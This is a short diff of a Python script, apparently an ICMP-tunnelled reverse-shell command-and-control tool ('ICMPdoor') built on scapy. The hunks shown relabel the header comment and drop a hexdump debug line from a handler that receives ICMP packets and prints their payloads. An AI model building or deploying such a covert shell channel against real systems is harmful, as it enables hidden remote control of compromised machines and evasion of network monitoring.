@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #By krabelize | cryptsus.com
-#ICMP reverse shell stub
+#ICMPdoor (reverse shell) C&C 
 from scapy.all import *
 from multiprocessing import Process
 import argparse
@@ -26,7 +26,6 @@ def shell(pkt):
     if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
         newpkt = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
         print(newpkt)
-        hexdump(pkt)
     else:
         pass
 
